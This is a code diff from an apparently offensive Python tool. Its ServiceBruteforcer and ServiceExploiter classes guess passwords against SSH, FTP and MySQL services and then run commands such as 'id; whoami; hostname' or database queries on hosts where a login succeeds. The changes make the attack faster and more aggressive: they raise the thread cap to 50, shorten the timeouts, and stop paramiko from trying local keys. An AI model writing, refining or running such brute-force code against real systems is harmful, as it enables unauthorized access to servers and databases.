@@ -3856,7 +3856,7 @@ class ServiceBruteforcer:
         self.target = target
         self.port = port
         self.service = service.lower()
-        self.threads = min(threads, 30)
+        self.threads = min(threads, 50)
         self.found = []
         self.lock = threading.Lock()
         self.q = Queue()
@@ -3882,8 +3882,9 @@ class ServiceBruteforcer:
             import paramiko
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(self.target, port=self.port or 22, username=user, password=pwd, timeout=6)
-            _, stdout, _ = client.exec_command("id;hostname")
+            client.connect(self.target, port=self.port or 22, username=user, password=pwd,
+                           timeout=4, look_for_keys=False, allow_agent=False)
+            _, stdout, _ = client.exec_command("id;hostname", timeout=4)
             o = stdout.read().decode().strip()[:100]
             client.close()
             return f"SSH: {o}"
@@ -3894,7 +3895,7 @@ class ServiceBruteforcer:
     def _try_ftp(self, user, pwd):
         try:
             import ftplib
-            ftp = ftplib.FTP(timeout=6)
+            ftp = ftplib.FTP(timeout=4)
             ftp.connect(self.target, self.port or 21)
             ftp.login(user, pwd)
             ftp.quit()
@@ -3906,7 +3907,7 @@ class ServiceBruteforcer:
     def _try_mysql(self, user, pwd):
         try:
             import pymysql
-            conn = pymysql.connect(host=self.target, port=self.port or 3306, user=user, password=pwd, connect_timeout=6)
+            conn = pymysql.connect(host=self.target, port=self.port or 3306, user=user, password=pwd, connect_timeout=4)
             cur = conn.cursor()
             cur.execute("SELECT CONCAT(version(),'|',user(),'|',database())")
             r = cur.fetchone()[0]
@@ -4015,8 +4016,9 @@ class ServiceExploiter:
         try:
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(self.target, port=port, username=self.username, password=self.password, timeout=10)
-            stdin, stdout, stderr = client.exec_command("id; whoami; hostname")
+            client.connect(self.target, port=port, username=self.username, password=self.password,
+                           timeout=6, look_for_keys=False, allow_agent=False)
+            stdin, stdout, stderr = client.exec_command("id; whoami; hostname", timeout=6)
             output = stdout.read().decode() + stderr.read().decode()
             client.close()
             return f"SSH LOGIN SUCCESS!\n{output}"
